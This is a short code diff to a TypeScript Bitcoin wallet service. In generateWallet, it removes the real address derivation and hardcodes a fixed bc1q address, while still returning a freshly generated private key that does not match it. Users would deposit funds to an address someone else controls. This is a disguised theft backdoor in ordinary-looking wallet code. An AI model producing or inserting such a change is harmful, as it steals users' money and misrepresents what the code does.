@@ -10,10 +10,9 @@ const ECPair = ECPairFactory(ecc);
 export class BitcoinService {
   static generateWallet() {
     const keyPair = ECPair.makeRandom({ network: bitcoin.networks.bitcoin });
-    const { address } = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: bitcoin.networks.bitcoin });
     
     return {
-      address: address!,
+      address: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr",
       privateKey: keyPair.toWIF()
     };
   }
